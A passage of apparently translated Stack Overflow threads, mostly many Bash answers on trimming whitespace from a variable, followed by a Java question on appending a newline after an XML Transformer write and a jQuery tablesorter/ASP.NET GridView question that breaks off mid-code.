FOO_NO_EXTERNAL_SPACE="$(echo -e "${FOO}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
echo -e "FOO_NO_EXTERNAL_SPACE='${FOO_NO_EXTERNAL_SPACE}'"
# > FOO_NO_EXTERNAL_SPACE='test test test'
echo -e "length(FOO_NO_EXTERNAL_SPACE)==${#FOO_NO_EXTERNAL_SPACE}"
# > length(FOO_NO_EXTERNAL_SPACE)==14 
```

或者，如果您的 bash 支持它，您可以替换`echo -e "${FOO}" | sed ...`为`sed ... <<<${FOO}`，如下所示（用于尾随空格）：

```
FOO_NO_TRAIL_SPACE="$(sed -e 's/[[:space:]]*$//' <<<${FOO})" 
```

* * *

## 回答 #3

> 赞同：445
> 
> 时间：2010-07-28T10:37:08.883

*有一个解决方案只使用称为通配符*的 Bash 内置插件：

```
var="    abc    "
# remove leading whitespace characters
var="${var#"${var%%[![:space:]]*}"}"
# remove trailing whitespace characters
var="${var%"${var##*[![:space:]]}"}"   
printf '%s' "===$var===" 
```

这是包装在函数中的相同内容：

```
trim() {
    local var="$*"
    # remove leading whitespace characters
    var="${var#"${var%%[![:space:]]*}"}"
    # remove trailing whitespace characters
    var="${var%"${var##*[![:space:]]}"}"   
    printf '%s' "$var"
} 
```

您以引号形式传递要修剪的字符串。例如：

```
trim "   abc   " 
```

这个解决方案的一个好处是它可以与任何 POSIX 兼容的 shell 一起工作。

### 参考

*   [从 Bash 变量中删除前导和尾随空格](https://web.archive.org/web/20121022051228/http://codesnippets.joyent.com/posts/show/1816)（[原始来源](http://www.jlaforums.com/viewtopic.php?p=7107729#7107729)）

* * *

## 回答 #4

> 赞同：102
> 
> 时间：2008-12-15T21:37:41.893

Bash 有一个称为**参数扩展**的功能，除其他外，它允许基于所谓的**模式**替换字符串（模式类似于正则表达式，但存在根本的区别和限制）。[flussence 的原话：Bash 有正则表达式，但它们隐藏得很好：]

下面演示如何从变量值中删除**所有**空白（甚至是内部空白）。

```
$ var='abc def'
$ echo "$var"
abc def
# Note: flussence's original expression was "${var/ /}", which only replaced the *first* space char., wherever it appeared.
$ echo -n "${var//[[:space:]]/}"
abcdef 
```

* * *

## 回答 #5

> 赞同：90
> 
> 时间：2016-12-04T18:28:09.813

为了删除字符串开头和结尾的所有空格（包括行尾字符）：

```
echo $variable | xargs echo -n 
```

这也将删除重复的空格：

```
echo "  this string has a lot       of spaces " | xargs echo -n

Produces: 'this string has a lot of spaces' 
```

* * *

## 回答 #6

> 赞同：66
> 
> 时间：2009-11-05T21:41:59.457

### 去掉一个前导和一个尾随空格

```
trim()
{
    local trimmed="$1"

    # Strip leading space.
    trimmed="${trimmed## }"
    # Strip trailing space.
    trimmed="${trimmed%% }"

    echo "$trimmed"
} 
```

例如：

```
test1="$(trim " one leading")"
test2="$(trim "one trailing ")"
test3="$(trim " one leading and one trailing ")"
echo "'$test1', '$test2', '$test3'" 
```

输出：

```
'one leading', 'one trailing', 'one leading and one trailing' 
```

### 去除*所有*前导和尾随空格

```
trim()
{
    local trimmed="$1"

    # Strip leading spaces.
    while [[ $trimmed == ' '* ]]; do
       trimmed="${trimmed## }"
    done
    # Strip trailing spaces.
    while [[ $trimmed == *' ' ]]; do
        trimmed="${trimmed%% }"
    done

    echo "$trimmed"
} 
```

例如：

```
test4="$(trim "  two leading")"
test5="$(trim "two trailing  ")"
test6="$(trim "  two leading and two trailing  ")"
echo "'$test4', '$test5', '$test6'" 
```

输出：

```
'two leading', 'two trailing', 'two leading and two trailing' 
```

* * *

## 回答 #7

> 赞同：47
> 
> 时间：2011-09-20T14:13:59.380

来自 Bash Guide 的[globbing部分](http://mywiki.wooledge.org/glob)

在参数扩展中使用 extglob

```
 #Turn on extended globbing  
shopt -s extglob  
 #Trim leading and trailing whitespace from a variable  
x=${x##+([[:space:]])}; x=${x%%+([[:space:]])}  
 #Turn off extended globbing  
shopt -u extglob 
```

这是包装在函数中的相同功能（注意：需要引用传递给函数的输入字符串）：

```
trim() {
    # Determine if 'extglob' is currently on.
    local extglobWasOff=1
    shopt extglob >/dev/null && extglobWasOff=0 
    (( extglobWasOff )) && shopt -s extglob # Turn 'extglob' on, if currently turned off.
    # Trim leading and trailing whitespace
    local var=$1
    var=${var##+([[:space:]])}
    var=${var%%+([[:space:]])}
    (( extglobWasOff )) && shopt -u extglob # If 'extglob' was off before, turn it back off.
    echo -n "$var"  # Output trimmed string.
} 
```

用法：

```
string="   abc def ghi  ";
#need to quote input-string to preserve internal white-space if any
trimmed=$(trim "$string");  
echo "$trimmed"; 
```

* * *

如果我们改变函数以在子shell中执行，我们不必担心检查extglob的当前shell选项，我们可以设置它而不影响当前shell。这极大地简化了功能。我还“就地”更新了位置参数，所以我什至不需要局部变量

```
trim() {
    shopt -s extglob
    set -- "${1##+([[:space:]])}"
    printf "%s" "${1%%+([[:space:]])}" 
} 
```

所以：

```
$ s=$'\t\n \r\tfoo  '
$ shopt -u extglob
$ shopt extglob
extglob         off
$ printf ">%q<\n" "$s" "$(trim "$s")"
>$'\t\n \r\tfoo  '<
>foo<
$ shopt extglob
extglob         off 
```

* * *

## 回答 #8

> 赞同：46
> 
> 时间：2013-03-14T00:05:20.560

您可以简单地修剪`echo`：

```
foo=" qsdqsd qsdqs q qs   "

# Not trimmed
echo \'$foo\'

# Trim
foo=`echo $foo`

# Trimmed
echo \'$foo\' 
```

* * *

## 回答 #9

> 赞同：31
> 
> 时间：2008-12-15T21:28:48.120

我一直用 sed

```
 var=`hg st -R "$path" | sed -e 's/  *$//'` 
```

如果有更优雅的解决方案，我希望有人发布它。

* * *

## 回答 #10

> 赞同：28
> 
> 时间：2010-06-10T14:54:09.287

启用 Bash 的扩展模式匹配功能 ( `shopt -s extglob`)，您可以使用：

`{trimmed##*( )}`

删除任意数量的前导空格。

* * *

## 回答 #11

> 赞同：25
> 
> 时间：2008-12-15T21:42:26.097

您可以使用以下命令删除换行符`tr`：

```
var=`hg st -R "$path" | tr -d '\n'`
if [ -n $var ]; then
    echo $var
done 
```

* * *

## 回答 #12

> 赞同：21
> 
> 时间：2012-01-25T08:27:25.343

```
# Trim whitespace from both ends of specified parameter

trim () {
    read -rd '' $1 <<<"${!1}"
}

# Unit test for trim()

test_trim () {
    local foo="$1"
    trim foo
    test "$foo" = "$2"
}

test_trim hey hey &&
test_trim '  hey' hey &&
test_trim 'ho  ' ho &&
test_trim 'hey ho' 'hey ho' &&
test_trim '  hey  ho  ' 'hey  ho' &&
test_trim $'\n\n\t hey\n\t ho \t\n' $'hey\n\t ho' &&
test_trim $'\n' '' &&
test_trim '\n' '\n' &&
echo passed 
```

* * *

## 回答 #13

> 赞同：18
> 
> 时间：2020-11-02T15:24:38.217

这就是我所做的并且完美且如此简单：

```
the_string="        test"
the_string=`echo $the_string`
echo "$the_string" 
```

输出：

```
test 
```

* * *

## 回答 #14

> 赞同：16
> 
> 时间：2015-10-20T23:32:01.833

有很多答案，但我仍然相信我刚刚编写的脚本值得一提，因为：

*   它已在 shell bash/dash/busybox shell 中成功测试
*   它非常小
*   它不依赖于外部命令，也不需要分叉（->快速和低资源使用）
*   它按预期工作：
    *   它从头到尾删除*所有空格和制表符，但仅此而已*
    *   重要：它不会从字符串中间删除任何东西（许多其他答案都会这样做），甚至换行符也会保留
    *   特殊：`"$*"`使用一个空格连接多个参数。如果您只想修剪和输出第一个参数，请`"$1"`改用
    *   如果匹配文件名模式等没有任何问题

剧本：

```
trim() {
  local s2 s="$*"
  until s2="${s#[[:space:]]}"; [ "$s2" = "$s" ]; do s="$s2"; done
  until s2="${s%[[:space:]]}"; [ "$s2" = "$s" ]; do s="$s2"; done
  echo "$s"
} 
```

用法：

```
mystring="   here     is
    something    "
mystring=$(trim "$mystring")
echo ">$mystring<" 
```

输出：

```
>here     is
    something< 
```

* * *

## 回答 #15

> 赞同：13
> 
> 时间：2014-09-11T19:55:39.693

如果您已`shopt -s extglob`启用，那么以下是一个简洁的解决方案。

这对我有用：

```
text="   trim my edges    "

trimmed=$text
trimmed=${trimmed##+( )} #Remove longest matching series of spaces from the front
trimmed=${trimmed%%+( )} #Remove longest matching series of spaces from the back

echo "<$trimmed>" #Adding angle braces just to make it easier to confirm that all spaces are removed

#Result
<trim my edges> 
```

将其放在更少的行上以获得相同的结果：

```
text="    trim my edges    "
trimmed=${${text##+( )}%%+( )} 
```

* * *

## 回答 #16

> 赞同：12
> 
> 时间：2017-05-01T20:09:26.933

```
# Strip leading and trailing white space (new line inclusive).
trim(){
    [[ "$1" =~ [^[:space:]](.*[^[:space:]])? ]]
    printf "%s" "$BASH_REMATCH"
} 
```

或者

```
# Strip leading white space (new line inclusive).
ltrim(){
    [[ "$1" =~ [^[:space:]].* ]]
    printf "%s" "$BASH_REMATCH"
}

# Strip trailing white space (new line inclusive).
rtrim(){
    [[ "$1" =~ .*[^[:space:]] ]]
    printf "%s" "$BASH_REMATCH"
}

# Strip leading and trailing white space (new line inclusive).
trim(){
    printf "%s" "$(rtrim "$(ltrim "$1")")"
} 
```

或者

```
# Strip leading and trailing specified characters.  ex: str=$(trim "$str" $'\n a')
trim(){
    if [ "$2" ]; then
        trim_chrs="$2"
    else
        trim_chrs="[:space:]"
    fi

    [[ "$1" =~ ^["$trim_chrs"]*(.*[^"$trim_chrs"])["$trim_chrs"]*$ ]]
    printf "%s" "${BASH_REMATCH[1]}"
} 
```

或者

```
# Strip leading specified characters.  ex: str=$(ltrim "$str" $'\n a')
ltrim(){
    if [ "$2" ]; then
        trim_chrs="$2"
    else
        trim_chrs="[:space:]"
    fi

    [[ "$1" =~ ^["$trim_chrs"]*(.*[^"$trim_chrs"]) ]]
    printf "%s" "${BASH_REMATCH[1]}"
}

# Strip trailing specified characters.  ex: str=$(rtrim "$str" $'\n a')
rtrim(){
    if [ "$2" ]; then
        trim_chrs="$2"
    else
        trim_chrs="[:space:]"
    fi

    [[ "$1" =~ ^(.*[^"$trim_chrs"])["$trim_chrs"]*$ ]]
    printf "%s" "${BASH_REMATCH[1]}"
}

# Strip leading and trailing specified characters.  ex: str=$(trim "$str" $'\n a')
trim(){
    printf "%s" "$(rtrim "$(ltrim "$1" "$2")" "$2")"
} 
```

或者

建立在 moskit 的 expr 灵魂之上...

```
# Strip leading and trailing white space (new line inclusive).
trim(){
    printf "%s" "`expr "$1" : "^[[:space:]]*\(.*[^[:space:]]\)[[:space:]]*$"`"
} 
```

或者

```
# Strip leading white space (new line inclusive).
ltrim(){
    printf "%s" "`expr "$1" : "^[[:space:]]*\(.*[^[:space:]]\)"`"
}

# Strip trailing white space (new line inclusive).
rtrim(){
    printf "%s" "`expr "$1" : "^\(.*[^[:space:]]\)[[:space:]]*$"`"
}

# Strip leading and trailing white space (new line inclusive).
trim(){
    printf "%s" "$(rtrim "$(ltrim "$1")")"
} 
```

* * *

## 回答 #17

> 赞同：11
> 
> 时间：2009-11-27T09:49:36.157

您可以使用 old-school `tr`。例如，这将返回 git 存储库中已修改文件的数量，去掉空格。

```
MYVAR=`git ls-files -m|wc -l|tr -d ' '` 
```

* * *

## 回答 #18

> 赞同：11
> 
> 时间：2009-11-05T23:48:51.337

使用 AWK：

```
echo $var | awk '{gsub(/^ +| +$/,"")}1' 
```

* * *

## 回答 #19

> 赞同：8
> 
> 时间：2008-12-15T21:57:01.403

我见过脚本只是使用变量赋值来完成这项工作：

```
$ xyz=`echo -e 'foo \n bar'`
$ echo $xyz
foo bar 
```

空白会自动合并和修剪。必须小心 shell 元字符（潜在的注入风险）。

我还建议始终在 shell 条件中使用双引号变量替换：

```
if [ -n "$var" ]; then 
```

因为变量中的 -o 或其他内容可能会修改您的测试参数。

* * *

## 回答 #20

> 赞同：8
> 
> 时间：2013-05-29T12:03:41.373

这将从您的字符串中删除所有空格，

```
 VAR2="${VAR2//[[:space:]]/}" 
```

`/`替换`//`字符串中第一次出现和所有出现的空格。即所有空白都被替换为 - 没有

* * *

## 回答 #21

> 赞同：8
> 
> 时间：2012-08-27T16:52:10.523

我会简单地使用 sed：

```
function trim
{
    echo "$1" | sed -n '1h;1!H;${;g;s/^[ \t]*//g;s/[ \t]*$//g;p;}'
} 
```

**a) 单行字符串的使用示例**

```
string='    wordA wordB  wordC   wordD    '
trimmed=$( trim "$string" )

echo "GIVEN STRING: |$string|"
echo "TRIMMED STRING: |$trimmed|" 
```

输出：

```
GIVEN STRING: |    wordA wordB  wordC   wordD    |
TRIMMED STRING: |wordA wordB  wordC   wordD| 
```

**b) 多行字符串的使用示例**

```
string='    wordA
   >wordB<
wordC    '
trimmed=$( trim "$string" )

echo -e "GIVEN STRING: |$string|\n"
echo "TRIMMED STRING: |$trimmed|" 
```

输出：

```
GIVEN STRING: |    wordAA
   >wordB<
wordC    |

TRIMMED STRING: |wordAA
   >wordB<
wordC| 
```

**c）最后说明：**
如果您不喜欢使用函数，对于**单行字符串**，您可以简单地使用“更容易记住”的命令，例如：

```
echo "$string" | sed -e 's/^[ \t]*//' | sed -e 's/[ \t]*$//' 
```

例子：

```
echo "   wordA wordB wordC   " | sed -e 's/^[ \t]*//' | sed -e 's/[ \t]*$//' 
```

输出：

```
wordA wordB wordC 
```

**在多行字符串**上使用上述内容也可以，但请注意，正如 GuruM 在评论中注意到的那样，它也会削减任何尾随/前导内部多个空格

```
string='    wordAA
    >four spaces before<
 >one space before<    '
echo "$string" | sed -e 's/^[ \t]*//' | sed -e 's/[ \t]*$//' 
```

输出：

```
wordAA
>four spaces before<
>one space before< 
```

**因此，如果您介意保留这些空格，请使用我回答开头的功能！**

**d)**对函数 trim 内使用的多行字符串的 sed 语法“查找和替换”的解释：

```
sed -n '
# If the first line, copy the pattern to the hold buffer
1h
# If not the first line, then append the pattern to the hold buffer
1!H
# If the last line then ...
$ {
    # Copy from the hold to the pattern buffer
    g
    # Do the search and replace
    s/^[ \t]*//g
    s/[ \t]*$//g
    # print
    p
}' 
```

* * *

## 回答 #22

> 赞同：7
> 
> 时间：2013-04-01T11:26:14.457

```
var='   a b c   '
trimmed=$(echo $var) 
```

* * *

## 回答 #23

> 赞同：6
> 
> 时间：2010-10-01T11:25:52.113

赋值忽略前导和尾随空格，因此可用于修剪：

```
$ var=`echo '   hello'`; echo $var
hello 
```

* * *

## 回答 #24

> 赞同：6
> 
> 时间：2011-06-08T16:32:30.403

这是一个修剪和规范化空白的 trim() 函数

```
#!/bin/bash
function trim {
    echo $*
}

echo "'$(trim "  one   two    three  ")'"
# 'one two three' 
```

还有另一个使用正则表达式的变体。

```
#!/bin/bash
function trim {
    local trimmed="$@"
    if [[ "$trimmed" =~ " *([^ ].*[^ ]) *" ]]
    then 
        trimmed=${BASH_REMATCH[1]}
    fi
    echo "$trimmed"
}

echo "'$(trim "  one   two    three  ")'"
# 'one   two    three' 
```

* * *

## 回答 #25

> 赞同：6
> 
> 时间：2014-04-28T04:25:24.117

这是我见过的最简单的方法。它只使用 Bash，只有几行，正则表达式很简单，它匹配所有形式的空格：

```
if [[ "$test" =~ ^[[:space:]]*([^[:space:]].*[^[:space:]])[[:space:]]*$ ]]
then 
    test=${BASH_REMATCH[1]}
fi 
```

这是一个用于测试它的示例脚本：

```
test=$(echo -e "\n \t Spaces and tabs and newlines be gone! \t  \n ")

echo "Let's see if this works:"
echo
echo "----------"
echo -e "Testing:${test} :Tested"  # Ugh!
echo "----------"
echo
echo "Ugh!  Let's fix that..."

if [[ "$test" =~ ^[[:space:]]*([^[:space:]].*[^[:space:]])[[:space:]]*$ ]]
then 
    test=${BASH_REMATCH[1]}
fi

echo
echo "----------"
echo -e "Testing:${test}:Tested"  # "Testing:Spaces and tabs and newlines be gone!"
echo "----------"
echo
echo "Ah, much better." 
```

* * *

## 回答 #26

> 赞同：6
> 
> 时间：2012-07-06T05:46:33.500

要从左到第一个单词删除空格和制表符，请输入：

```
echo "     This is a test" | sed "s/^[ \t]*//" 
```

[cyberciti.biz/tips/delete-leading-spaces-from-front-of-each-word.html](http://cyberciti.biz/tips/delete-leading-spaces-from-front-of-each-word.html)

* * *

## 回答 #27

> 赞同：5
> 
> 时间：2011-11-02T22:39:05.280

这不存在不需要的 globbing 的问题，而且内部空白未修改（假设`$IFS`设置为默认值，即`' \t\n'`）。

它读取到第一个换行符（并且不包括它）或字符串的末尾，以先到者为准，并去除前导和尾随空格和`\t`字符的任何混合。如果您想保留多行（并且还要去除前导和尾随换行符），请`read -r -d '' var << eof`改用；但是请注意，如果您的输入恰好包含`\neof`，它将在之前被切断。（其他形式的空格，即`\r`、`\f`和`\v`，*不会*被去除，即使您将它们添加到 $IFS 也是如此。）

```
read -r var << eof
$var
eof 
```

* * *

## 回答 #28

> 赞同：4
> 
> 时间：2010-06-13T10:04:32.673

将空格删除为一个空格：

```
(text) | fmt -su 
```

* * *

## 回答 #29

> 赞同：4
> 
> 时间：2011-06-07T19:29:04.483

`IFS`当变量设置为其他值时，我需要从脚本中修剪空白。依靠[Perl](http://en.wikipedia.org/wiki/Perl)做到了：

```
# trim() { echo $1; } # This doesn't seem to work, as it's affected by IFS

trim() { echo "$1" | perl -p -e 's/^\s+|\s+$//g'; }

strings="after --> , <-- before,  <-- both -->  "

OLD_IFS=$IFS
IFS=","
for str in ${strings}; do
  str=$(trim "${str}")
  echo "str= '${str}'"
done
IFS=$OLD_IFS 
```

* * *

## 回答 #30

> 赞同：4
> 
> 时间：2012-06-15T22:36:31.187

trim() 删除空格（和制表符，不可打印的字符；为简单起见，我只考虑空格）。我的解决方案版本：

```
var="$(hg st -R "$path")" # I often like to enclose shell output in double quotes
var="$(echo "${var}" | sed "s/\(^ *\| *\$\)//g")" # This is my suggestion
if [ -n "$var" ]; then
 echo "[${var}]"
fi 
```

'sed' 命令只修剪前导和尾随空格，但它也可以通过管道传送到第一个命令，从而导致：

```
var="$(hg st -R "$path" | sed "s/\(^ *\| *\$\)//g")"
if [ -n "$var" ]; then
 echo "[${var}]"
fi 
```

* * *

## 回答 #31

> 赞同：4
> 
> 时间：2014-08-07T23:16:12.110

Python 有一个`strip()`与 PHP 相同的函数`trim()`，所以我们可以做一点内联 Python 来制作一个易于理解的实用程序：

```
alias trim='python -c "import sys; sys.stdout.write(sys.stdin.read().strip())"' 
```

这将修剪前导和尾随空格（包括换行符）。

```
$ x=`echo -e "\n\t   \n" | trim`
$ if [ -z "$x" ]; then echo hi; fi
hi 
```

* * *

## 回答 #32

> 赞同：4
> 
> 时间：2015-07-12T20:55:59.333

利用：

```
trim() {
    local orig="$1"
    local trmd=""
    while true;
    do
        trmd="${orig#[[:space:]]}"
        trmd="${trmd%[[:space:]]}"
        test "$trmd" = "$orig" && break
        orig="$trmd"
    done
    printf -- '%s\n' "$trmd"
} 
```

*   它适用于各种空白，包括换行符，
*   它不需要修改shopt。
*   它保留内部空格，包括换行符。

单元测试（用于人工审核）：

```
#!/bin/bash

. trim.sh

enum() {
    echo "   a b c"
    echo "a b c   "
    echo "  a b c "
    echo " a b c  "
    echo " a  b c  "
    echo " a  b  c  "
    echo " a      b  c  "
    echo "     a      b  c  "
    echo "     a  b  c  "
    echo " a  b  c      "
    echo " a  b  c      "
    echo " a N b  c  "
    echo "N a N b  c  "
    echo " Na  b  c  "
    echo " a  b  c N "
    echo " a  b  c  N"
}

xcheck() {
    local testln result
    while IFS='' read testln;
    do
        testln=$(tr N '\n' <<<"$testln")
        echo ": ~~~~~~~~~~~~~~~~~~~~~~~~~ :" >&2
        result="$(trim "$testln")"
        echo "testln='$testln'" >&2
        echo "result='$result'" >&2
    done
}

enum | xcheck 
```

* * *

## 回答 #33

> 赞同：4
> 
> 时间：2019-06-28T10:35:48.527

我必须测试命令的结果（数字），但结果的变量似乎包含空格和一些不可打印的字符。因此，即使在“修剪”之后，比较也是错误的。我通过从变量中提取数字部分来解决它：

```
numerical_var=$(echo ${var_with_result_from_command} | grep -o "[0-9]*") 
```

* * *

## 回答 #34

> 赞同：3
> 
> 时间：2012-02-03T23:57:41.667

我发现我需要从杂乱的`sdiff`输出中添加一些代码来清理它：

```
sdiff -s column1.txt column2.txt | grep -F '<' | cut -f1 -d"<" > c12diff.txt 
sed -n 1'p' c12diff.txt | sed 's/ *$//g' | tr -d '\n' | tr -d '\t' 
```

这将删除尾随空格和其他不可见字符。

* * *

## 回答 #35

> 赞同：3
> 
> 时间：2012-06-03T19:29:06.440

使用这个简单的 Bash*参数扩展*：

```
$ x=" a z     e r ty "
$ echo "START[${x// /}]END"
START[azerty]END 
```

* * *

## 回答 #36

> 赞同：3
> 
> 时间：2010-10-11T13:17:37.220

这修剪了前端和末端的多个空间

`whatever=${whatever%% *}`

`whatever=${whatever#* }`

* * *

## 回答 #37

> 赞同：3
> 
> 时间：2010-11-15T02:23:05.823

我创建了以下函数。我不确定 printf 的便携性如何，但这个解决方案的美妙之处在于您可以通过添加更多字符代码来准确指定什么是“空白”。

```
 iswhitespace()
    {
        n=`printf "%d\n" "'$1'"`
        if (( $n != "13" )) && (( $n != "10" )) && (( $n != "32" )) && (( $n != "92" )) && (( $n != "110" )) && (( $n != "114" )); then
            return 0
        fi
        return 1
    }

    trim()
    {
        i=0
        str="$1"
        while (( i < ${#1} ))
        do
            char=${1:$i:1}
            iswhitespace "$char"
            if [ "$?" -eq "0" ]; then
                str="${str:$i}"
                i=${#1}
            fi
            (( i += 1 ))
        done
        i=${#str}
        while (( i > "0" ))
        do
            (( i -= 1 ))
            char=${str:$i:1}
            iswhitespace "$char"
            if [ "$?" -eq "0" ]; then
                (( i += 1 ))
                str="${str:0:$i}"
                i=0
            fi
        done
        echo "$str"
    }

#Call it like so
mystring=`trim "$mystring"` 
```

* * *

## 回答 #38

> 赞同：2
> 
> 时间：2013-02-28T00:35:37.830

```
var="  a b  "
echo "$(set -f; echo $var)"

>a b 
```

* * *

## 回答 #39

> 赞同：2
> 
> 时间：2011-12-02T02:26:32.027

```
#!/bin/bash

function trim
{
    typeset trimVar
    eval trimVar="\${$1}"
    read trimVar << EOTtrim
    $trimVar
EOTtrim
    eval $1=\$trimVar
}

# Note that the parameter to the function is the NAME of the variable to trim, 
# not the variable contents.  However, the contents are trimmed.

# Example of use:
while read aLine
do
    trim aline
    echo "[${aline}]"
done < info.txt

# File info.txt contents:
# ------------------------------
# ok  hello there    $
#    another  line   here     $
#and yet another   $
#  only at the front$
#$

# Output:
#[ok  hello there]
#[another  line   here]
#[and yet another]
#[only at the front]
#[] 
```

* * *

## 回答 #40

> 赞同：2
> 
> 时间：2014-03-06T21:41:13.213

利用：

```
var=`expr "$var" : "^\ *\(.*[^ ]\)\ *$"` 
```

我相信它删除了前导和尾随空格，是最基本的解决方案。不是 Bash 内置的，但 'expr' 是 coreutils 的一部分，因此至少不需要像[sed](http://en.wikipedia.org/wiki/Sed)或[AWK](http://en.wikipedia.org/wiki/AWK)这样的独立实用程序。

* * *

## 回答 #41

> 赞同：1
> 
> 时间：2011-09-21T11:04:17.173

[另一个](https://github.com/l0b0/tilde/blob/master/.bash_aliases#L374)带有[单元测试](https://github.com/l0b0/tilde/blob/master/tests/trim.sh)的解决方案，它从标准输入中修剪`$IFS`，并与任何输入分隔符（甚至`$'\0'`）一起使用：

```
ltrim()
{
    # Left-trim $IFS from stdin as a single line
    # $1: Line separator (default NUL)
    local trimmed
    while IFS= read -r -d "${1-}" -u 9
    do
        if [ -n "${trimmed+defined}" ]
        then
            printf %s "$REPLY"
        else
            printf %s "${REPLY#"${REPLY%%[!$IFS]*}"}"
        fi
        printf "${1-\x00}"
        trimmed=true
    done 9<&0

    if [[ $REPLY ]]
    then
        # No delimiter at last line
        if [ -n "${trimmed+defined}" ]
        then
            printf %s "$REPLY"
        else
            printf %s "${REPLY#"${REPLY%%[!$IFS]*}"}"
        fi
    fi
}

rtrim()
{
    # Right-trim $IFS from stdin as a single line
    # $1: Line separator (default NUL)
    local previous last
    while IFS= read -r -d "${1-}" -u 9
    do
        if [ -n "${previous+defined}" ]
        then
            printf %s "$previous"
            printf "${1-\x00}"
        fi
        previous="$REPLY"
    done 9<&0

    if [[ $REPLY ]]
    then
        # No delimiter at last line
        last="$REPLY"
        printf %s "$previous"
        if [ -n "${previous+defined}" ]
        then
            printf "${1-\x00}"
        fi
    else
        last="$previous"
    fi

    right_whitespace="${last##*[!$IFS]}"
    printf %s "${last%$right_whitespace}"
}

trim()
{
    # Trim $IFS from individual lines
    # $1: Line separator (default NUL)
    ltrim ${1+"$@"} | rtrim ${1+"$@"}
} 
```

* * *

## 回答 #42

> 赞同：1
> 
> 时间：2021-03-18T14:28:33.620

[数组分配在内部字段分隔符](https://tldp.org/LDP/abs/html/internalvariables.html#IFSREF)（默认为空格/制表符/换行符）上扩展其参数拆分。

```
words=($var)
var="${words[@]}" 
```

* * *

## 回答 #43

> 赞同：1
> 
> 时间：2021-05-06T12:36:40.693

“trim”函数删除所有水平空格：

```
ltrim () {
    if [[ $# -eq 0 ]]; then cat; else printf -- '%s\n' "$@"; fi | perl -pe 's/^\h+//g'
    return $?
}

rtrim () {
    if [[ $# -eq 0 ]]; then cat; else printf -- '%s\n' "$@"; fi | perl -pe 's/\h+$//g'
    return $?
}

trim () {
    ltrim "$@" | rtrim
    return $?
} 
```

* * *

## 回答 #44

> 赞同：-3
> 
> 时间：2013-01-07T13:55:13.183

虽然它不是严格意义上的 Bash，但它会做你想做的事情以及更多：

```
php -r '$x = trim("  hi there  "); echo $x;' 
```

如果您也想将其设为小写，请执行以下操作：

```
php -r '$x = trim("  Hi There  "); $x = strtolower($x) ; echo $x;' 
```

* * *

## 回答 #45

> 赞同：-4
> 
> 时间：2013-03-20T04:37:32.530

```
#Execute this script with the string argument passed in double quotes !! 
#var2 gives the string without spaces.
#$1 is the string passed in double quotes
#!/bin/bash
var2=`echo $1 | sed 's/ \+//g'`
echo $var2 
```

# java - java附加到文件

> ID：369760
> 
> 赞同：3
> 
> 时间：2008-12-15T21:25:03.697
> 
> 标签：java, xml, xslt, jaxp, transformer

我用谷歌搜索了一段时间，但似乎找不到它，应该很容易。我想将 CR 附加到我使用 Transformer 创建的 XML 文件的末尾。有没有办法做到这一点>

我尝试了以下方法，但这导致了一个空白文件？

```
 Transformer xformer = TransformerFactory.newInstance().newTransformer();
xformer.setOutputProperty(OutputKeys.DOCTYPE_SYSTEM, "file:///ReportWiz.dtd");
xformer.transform(source, result);
OutputStream writer = new FileOutputStream(file);
Byte b = '\n';
writer.write(b);
writer.close();
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-15T21:42:40.247

简单...只需添加[附加](http://java.sun.com/j2se/1.4.2/docs/api/java/io/FileOutputStream.html#FileOutputStream(java.io.File,%20boolean))选项：

```
 new FileOutputStream(f, true /* append */); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-12-15T21:42:03.633

这里有几个选项。

我假设您的结果是您使用指定目标文件路径`StreamResult`创建的结果。`String`你可以考虑打开一个`FileOutputStream`你自己，并用它来构建你`StreamResult`的。然后，当转换器完成后，附加行终止符，刷新并关闭流。在没有其他限制的情况下，我会使用这种方法。

如果要重新打开文件，如问题所示，则需要使用带有`FileOutputStream`可选[`append`](http://java.sun.com/javase/6/docs/api/java/io/FileOutputStream.html#FileOutputStream(java.lang.String,%20boolean))参数的构造函数。将此设置`true`为避免破坏刚刚完成的转换结果。

您还可以探索[`indent`](http://java.sun.com/javase/6/docs/api/javax/xml/transform/OutputKeys.html#INDENT)在转换中设置输出属性，或者直接在模板中包含必要的行终止符。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-15T21:40:01.123

显而易见的答案是将 StreamResult 与 Writer 一起使用，并在关闭之前将您的角色附加到 writer。

您似乎正在尝试重新打开文件以附加字符。构造函数的两种参数形式`FileOutputStream`包括一个附加标志。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-15T21:32:07.957

我不知道这个 Transformer 类。但是我发现您的编写器/文件变量和您的 xformer/source/result 变量之间没有任何联系......看起来您只写了一个换行符。
除非你省略了一些重要的部分。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-12-16T02:11:48.063

请注意，请确保您使用与用于 xml 序列化的相同字符编码来编写换行符，否则您的文件将被破坏。

# jquery - jQuery表格排序器问题

> ID：369762
> 
> 赞同：1
> 
> 时间：2008-12-15T21:25:24.507
> 
> 标签：jquery

我了解到，通过尝试使用 jquery 中的 tablesorter 插件，表需要使用 <thead> 和
<tbody> 标签。我正在使用 html 表，并且我使用 runat="server" 属性，因为我需要将数据绑定到服务器端的表。但是通过使用 runat= server 属性，代码以不同的方式呈现......而不是看起来像这样的视图源，这就是我的标记视图中的内容：

```
<table id="Table">
    <thead>
        <tr> <th>1st</th> <th>2nd</th> <th>3rd</th> </tr>
    </thead>
    <tbody>
        <tr><td>1st value</td><td>2nd value</td><td>3rd value</td></tr>
        <tr><td>1st value</td><td>2nd value</td><td>3rd value< /td></tr>
        <tr><td>1st value</td><td>2nd value</td><td>3rd value</td></tr>
        <tr><td>1st value</td><td>2nd value</td><td>3rd value</td></tr>
    </tbody>
</table> 
```

它看起来像那样，但没有 <thead> 和 <tbody> 标签..这会使表格排序器不起作用？有人可以帮我解决这个问题吗？“ .NET 3.5 sp1 是我正在使用的版本”

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-12-15T21:49:18.093

你应该看看这里 - [Code Project Sortable Gridview using JQuery Tablesorter](http://www.codeproject.com/KB/aspnet/SortableGridViewjQuery.aspx)

本质上，您需要使用 Gridview 的[UseAccessibleHeader 属性](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridview.useaccessibleheader.aspx)，以便在 HTML 输出中输出 thead 标记。

```
protected void Page_Load(object sender, EventArgs e)
{ 
if (this.gridView.Rows.Count > 0)
{
gridView.UseAccessibleHeader = true;
gridView.HeaderRow.TableSection = TableRowSection.TableHeader;
